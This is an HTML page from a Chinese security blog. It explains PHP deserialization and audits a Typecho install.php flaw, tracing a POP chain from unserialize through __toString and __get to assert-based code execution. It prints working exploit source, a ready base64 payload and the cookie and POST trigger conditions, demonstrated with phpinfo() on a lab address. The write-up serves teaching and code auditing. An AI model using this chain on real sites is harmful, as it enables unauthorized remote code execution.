@@ -1,0 +1,269 @@
+<script type="text/javascript" src="/js/crash_cheat.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>某博客反序列化前台getshell | jasson个人博客</title><meta name="keywords" content="web安全,反序列化,代码审计,渗透测试"><meta name="author" content="jasson"><meta name="copyright" content="jasson"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="某博客反序列化前台getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某博客反序列化前台getshell">
+<meta property="og:url" content="https://j-jasson2.github.io/2020/12/06/%E6%9F%90%E5%8D%9A%E5%AE%A2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="jasson个人博客">
+<meta property="og:description" content="某博客反序列化前台getshell">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893810-a24b5ae5-8448-4971-b2c1-07ccc03256c1.png#averageHue=%23eeedec&height=227&id=dqNdT&originHeight=919&originWidth=1683&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416">
+<meta property="article:published_time" content="2020-12-06T06:05:18.000Z">
+<meta property="article:modified_time" content="2023-02-01T02:22:52.490Z">
+<meta property="article:author" content="jasson">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893810-a24b5ae5-8448-4971-b2c1-07ccc03256c1.png#averageHue=%23eeedec&height=227&id=dqNdT&originHeight=919&originWidth=1683&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><link rel="shortcut icon" href="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&refer=http%3A%2F%2Finews.gtimg.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1630728108&t=1576409e5f212dd7279b9a1c880c7086"><link rel="canonical" href="https://j-jasson2.github.io/2020/12/06/%E6%9F%90%E5%8D%9A%E5%AE%A2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E5%8F%B0getshell/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"top-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '某博客反序列化前台getshell',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-01 10:22:52'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Finews.gtimg.com%2Fnewsapp_match%2F0%2F12039801160%2F0.jpg&amp;refer=http%3A%2F%2Finews.gtimg.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1630728108&amp;t=1576409e5f212dd7279b9a1c880c7086" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">80</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893810-a24b5ae5-8448-4971-b2c1-07ccc03256c1.png#averageHue=%23eeedec&amp;height=227&amp;id=dqNdT&amp;originHeight=919&amp;originWidth=1683&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=416')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">jasson个人博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/timeline/"><i class="fa-fw fa fa-bell"></i><span> 日志</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">某博客反序列化前台getshell</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-06T06:05:18.000Z" title="发表于 2020-12-06 14:05:18">2020-12-06</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-01T02:22:52.490Z" title="更新于 2023-02-01 10:22:52">2023-02-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="某博客反序列化前台getshell"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><meta name="referrer" content="no-referrer"/>
+
+<h2 id="序列化和反序列化"><a href="#序列化和反序列化" class="headerlink" title="序列化和反序列化"></a>序列化和反序列化</h2><h4 id="什么是序列化？"><a href="#什么是序列化？" class="headerlink" title="什么是序列化？"></a>什么是序列化？</h4><p>序列化 （serialize)，将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。<br>也就是说，将状态信息保存为字符串了，后面还可以通过字符串还原该状态信息。在PHP中序列化使用函数为serialize()。<br>简单的理解：将PHP中 对象、类、数组、变量、匿名函数等，转化为字符串，方便保存到数据库或者文件中。</p>
+<h4 id="什么是反序列化？"><a href="#什么是反序列化？" class="headerlink" title="什么是反序列化？"></a>什么是反序列化？</h4><p>序列化是将对象的状态信息转为字符串储存起来，那么反序列化（unserialize）就是再将这个状态信息拿出来使用。例如重新再转化为对象或者其他状态信息等。<br>也就是说，将字符串还原为状态信息了。在PHP中反序列化使用函数为unserialize()。<br>简单的理解：将数据库或者文件中的序列化之后的字符串，还原回PHP中 对象、类、数组、变量、匿名函数等。</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>在网站开发过程中，有些对象信息需要传递，又不能通过重写类，那么就需要通过序列化之后的字符串进行传递，传递后再反序列化回来执行操作。那么如果可以控制被反序列化的内容，是不是就可以让它执行我们需要的代码呢？<br>其实远没有那么简单，我们反序列化的内容，类名必须与原来的类相同，也就是原来的类还需要存在，不能自己定义一个类。所以要使反序列化成为漏洞，还需要魔术方法（“Magic function”）的配合。通过重写触发的魔术方法，将序列化之后的字符串传入给网站执行反序列化操作，触发魔术方法执行我们需要执行的代码。</p>
+<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>在PHP中，有这样一类函数，在函数名前面有两个__，只要满足一定条件就自动触发执行该函数的内容，也就是所谓的魔术方法。<br>反序列化漏洞要利用势必离不开魔术方法，下面介绍一些常用的PHP反序列化有关的魔术方法：<br>表*-*常用的与反序列化相关的魔术方法</p>
+<table>
+<thead>
+<tr>
+<th>__wakeup()</th>
+<th>使用unserialize时触发</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__sleep()</td>
+<td>使用serialize时触发</td>
+</tr>
+<tr>
+<td>__destruct()</td>
+<td>对象被销毁时触发</td>
+</tr>
+<tr>
+<td>__call()</td>
+<td>在对象上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td>__callStatic()</td>
+<td>在静态上下文中调用不可访问的方法时触发</td>
+</tr>
+<tr>
+<td>__get()</td>
+<td>用于从不可访问的属性读取数据</td>
+</tr>
+<tr>
+<td>__set()</td>
+<td>用于将数据写入不可访问的属性</td>
+</tr>
+<tr>
+<td>__isset()</td>
+<td>在不可访问的属性上调用isset()或empty()触发</td>
+</tr>
+<tr>
+<td>__unset()</td>
+<td>在不可访问的属性上使用unset()时触发</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>当对象被当作字符串输出的时候自动触发</td>
+</tr>
+<tr>
+<td>__invoke()</td>
+<td>当脚本尝试将对象调用为函数时触发</td>
+</tr>
+</tbody></table>
+<p> </p>
+<h2 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h2><p>1、寻找反序列化漏洞，那么肯定需要寻找unserialize函数，先进行全局搜索。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317887599-f476cb0b-134d-4475-8ea4-49f0b06b2097.png#averageHue=%23efefef&height=192&id=Z1efZ&originHeight=570&originWidth=1233&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><br>2、在install.php文件，点进去查看一下。首先看到了我们需要的unserialize反序列化函数，base64解码，之后是通过get方法获取__typecho_config。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317888189-c3ae8b99-0055-4188-83ac-79f312875936.png#averageHue=%23fcfbf2&height=219&id=B0tyj&originHeight=593&originWidth=1126&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>3、因为程序是从上往下执行的，所以我们要确保程序能够执行到这一步，查看上面是否有分支是die()或者exit()等退出函数。在代码前面发现了几个条件分支，通过if判断是否进入exit。首先第一个分支，只需要GET[‘finish’]不为空即可跳过。第二个分支，empty函数的作用是检测里面的传参是否为空，所以referer需要不为空。最后一个分支，referer需要是本站点。三个条件都满足，即可将代码执行到反序列化处。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317888725-933c0ee7-2f4e-4f30-9bfa-995cba804c6a.png#averageHue=%23fefdfd&height=143&id=PYxaX&originHeight=429&originWidth=1244&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>4、继续跟进刚刚的get函数，在Cookie.php文件定位到该函数。作用是看到就是一个检测是否在cookie中，如果不在cookie中则从post数据中获取。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317889241-5c037315-cc65-4fa8-93e9-52e2c0eeabbd.png#averageHue=%23fcfbfb&height=56&id=yrjw0&originHeight=157&originWidth=1161&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><br>5、回到反序列化处，在后面新建了一个类的对象，传入了adapter和prefix的值。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317889678-20c50ce2-375d-4f9c-9837-13a71cc33c71.png#averageHue=%23fcfbdf&height=60&id=OBpPx&originHeight=173&originWidth=1199&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>6、跟进Typecho_Db类，找到在Db.php文件中。这里看到一个魔术方法__construct，在数据库适配器的地方，定义$adapterName的时候拼接了一个字符串。众所周知的，PHP是弱类型的语言，将一个类与字符串拼接的时候，会将类强制转换成字符串，那么就会触发__toString魔术方法了。所以我们的adapter传参需要传输一个类，触发__toString魔术方法。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317890183-e6c87bda-98ff-489c-8b01-065a8077eca2.png#averageHue=%23fdfcfc&height=213&id=sIvqb&originHeight=474&originWidth=923&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>7、现在有反序列化点，有触发魔术方法点了，那么就全局搜索一下哪些文件有__toString魔术方法，这里发现了3个文件。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317890664-475c74ca-3e21-4164-81b2-1eb222ee399b.png#averageHue=%23eeeeee&height=115&id=Pfgd3&originHeight=294&originWidth=1065&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>8、查看Feed文件的__toString魔术方法内容，发现调用了$item[‘author’]-&gt;screenname ，而$item的值是通过_items循环获取的。在执行过程中这里会获取该类的screenName属性，如果我们给$item[‘author’]设置的类中没有screenName，那么就是从不可访问的属性中读取数据，就会触发__get()魔术方法。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317890946-8b34bb1f-eb7c-4fd6-a64c-330fbf7e891b.png#averageHue=%23fcfbfa&height=64&id=cZtcD&originHeight=186&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>9、继续全局搜索一下__get()魔术方法，在/var/Typecho/Request.php文件中发现了这个魔术方法传入一个值，调用了get函数处理之后返回。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317891743-b39233f8-a873-401d-8049-bb6a34a76fc4.png#averageHue=%23fdfdfc&height=69&id=DDQ3x&originHeight=115&originWidth=596&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=358"><br>10、全文追踪get函数，进行了一些是否存在、是不是数组的判断。在最后面，调用了函数_applyFilter进行处理。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317892240-93782e69-6576-40b3-99e1-ae33d71a066f.png#averageHue=%23fcfcfb&height=180&id=YIBvz&originHeight=357&originWidth=825&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>11、全文追踪_applyFilter函数，这里发现检测value是不是数组，是的话就执行array_map函数、不是的话就执行call_user_func函数。这里$filter和$value都是我们可以控制的，也就是说，这里可以借助函数执行php代码。例如传入一个数组，执行array_map函数，传参键为assert，值为php代码，即可以造成任意代码执行漏洞，也就是RCE。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317892463-0f941b08-e795-4c65-a4e6-7660c0358d65.png#averageHue=%23fdfdf4&height=129&id=t2wCP&originHeight=282&originWidth=910&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>12、现在就需要理一理POP利用链。首先在install.php文件为反序列化点，也就是说我们需要在这里上传POC。install.php调用了Cookie.php的get函数使我们可以通过cookie或post传参。install.php还新建了Db.php文件中类的对象，触发了其中的__construct魔术方法，这个魔术方法可以触发Feed.php文件中的__toString魔术方法，这里的魔术方法再通过传参为非screenName触发Request.php文件中的__get魔术方法，这个魔术方法调用了get函数，get函数调用了_applyFilter函数，就在这个函数中，存在可以任意代码执行的漏洞。</p>
+<h2 id="构造反序列化EXP"><a href="#构造反序列化EXP" class="headerlink" title="构造反序列化EXP"></a>构造反序列化EXP</h2><p>通过上面的利用链，成功构造生成序列化的源码。需要利用两个类，一个是Feed.php文件中的Typecho_Feed类，第二个是需要重写两个数组的Typecho_Request类，可以看到一个传参为assert，另一个传参为要执行的代码eval(&#39;phpinfo();exit();&#39;)，表示执行phpinfo()函数。<br><?php
+class Typecho_Request
+{
+    private $_params = array('screenName'=>'eval(\'phpinfo();exit();\')');
+    private $_filter = array('assert');
+}
+class Typecho_Feed
+{
+    private $_type = 'RSS 2.0';
+    private $_items;
+    public function __construct($x1)
+    {
+        $this->_items[] = array('author'=>$x1);
+    }
+}
+$payload1 = new Typecho_Request();
+$payload2 = new Typecho_Feed($payload1);
+$exp['adapter'] = $payload2;
+$exp['prefix'] = 'c1tas';
+echo base64_encode(serialize($exp));
+?></p>
+<h2 id="实战渗透测试反序列化漏洞"><a href="#实战渗透测试反序列化漏洞" class="headerlink" title="实战渗透测试反序列化漏洞"></a>实战渗透测试反序列化漏洞</h2><p>1、 首先将exp源码保存为exp.php文件，执行该PHP获取payload。<br>YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NToiYzF0YXMiO30=<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317892806-fb4e6d7f-45bb-4860-95bf-b7007aeea862.png#averageHue=%23fdfdfc&height=174&id=XIvPA&originHeight=505&originWidth=1209&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><br>2、 访问站点，这是一个博客网站<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893028-551b524c-1e67-4565-b1e4-50e2f649bcec.png#averageHue=%23fdfdfd&height=273&id=qZ8vq&originHeight=778&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=415"><br>3、访问存在漏洞的install.php文件，页面空白，说明文件存在，可以使用反序列化漏洞任意代码执行。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893341-8f2bf32d-0e93-4968-b0b3-0e5c965171de.png#averageHue=%23fefefe&height=251&id=HHCW3&originHeight=675&originWidth=1117&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><br>4、使用生成的payload进行攻击，需要满足3个条件：<br>（1）需要有finish传参<br>（2）referrer为本站点，即<a target="_blank" rel="noopener" href="http://192.168.43.87/">http://192.168.43.87/</a><br>（3）通过cookie或post 传参POC，键名为__typecho_config，键值为生成的payload<br>如图，通过cookie传参poc，成功执行了phpinfo()函数。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893810-a24b5ae5-8448-4971-b2c1-07ccc03256c1.png#averageHue=%23eeedec&height=227&id=dqNdT&originHeight=919&originWidth=1683&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"><br>5、使用POST传参方式，同样执行了phpinfo()函数。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317894352-924cbf02-eabe-4664-9a0b-a41fa540187c.png#averageHue=%23c29155&height=186&id=PMJvr&originHeight=739&originWidth=1656&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=&width=416"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">jasson</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://j-jasson2.github.io/2020/12/06/%E6%9F%90%E5%8D%9A%E5%AE%A2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%89%8D%E5%8F%B0getshell/">https://j-jasson2.github.io/2020/12/06/某博客反序列化前台getshell/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://j-jasson2.github.io" target="_blank">jasson个人博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web%E5%AE%89%E5%85%A8/">web安全</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><a class="post-meta__tags" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317893810-a24b5ae5-8448-4971-b2c1-07ccc03256c1.png#averageHue=%23eeedec&amp;height=227&amp;id=dqNdT&amp;originHeight=919&amp;originWidth=1683&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;title=&amp;width=416" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/12/08/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84dnslog%E6%9C%8D%E5%8A%A1%E5%99%A8/"><img class="prev-cover" src="/images/18/8.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">如何搭建自己的dnslog服务器</div></div></a></div><div class="next-post pull-right"><a href="/2020/11/29/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"><img class="next-cover" src="/images/14/7.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">漏洞复现-Redis未授权访问</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2022/11/16/记一次文件下载getshell代码审计/" title="记一次文件下载getshell代码审计"><img class="cover" src="https://cdn.nlark.com/yuque/0/2022/png/12366538/1665933712004-b1e5833c-2f0f-47a0-bccb-aa58dd2eeed2.png#averageHue=%23282c2d&clientId=ua2bc1d8e-a387-4&from=paste&height=541&id=ueddfd14f&name=image.png&originHeight=1082&originWidth=2168&originalType=binary&ratio=1&rotation=0&showTitle=false&size=631007&status=done&style=none&taskId=u6aab1ec8-11d2-40fb-b165-640e8d3173d&title=&width=1084" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-16</div><div class="title">记一次文件下载getshell代码审计</div></div></a></div><div><a href="/2021/07/02/PHP无回显渗透测试总结/" title="PHP无回显渗透测试总结"><img class="cover" src="/images/phpwhx.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-02</div><div class="title">PHP无回显渗透测试总结</div></div></a></div><div><a href="/2022/07/06/未授权、越权类漏洞探究/" title="未授权、越权类漏洞探究"><img class="cover" src="https://cdn.nlark.com/yuque/0/2022/png/12366538/1656467797684-664216b5-ed4f-4482-9923-a0a0b276a129.png#averageHue=%23daa779&clientId=u31016762-981a-4&from=paste&height=399&id=u63564e6d&name=image.png&originHeight=639&originWidth=708&originalType=binary&ratio=1&rotation=0&showTitle=false&size=191969&status=done&style=none&taskId=uc054a173-f9fd-4d92-bba8-ca590027a95&title=&width=442" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-07-06</div><div class="title">未授权、越权类漏洞探究</div></div></a></div><div><a href="/2023/01/31/TemplatesImpl利用链与内存马/" title="TemplatesImpl利用链与内存马"><img class="cover" src="/images/TemplatesImpl.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div 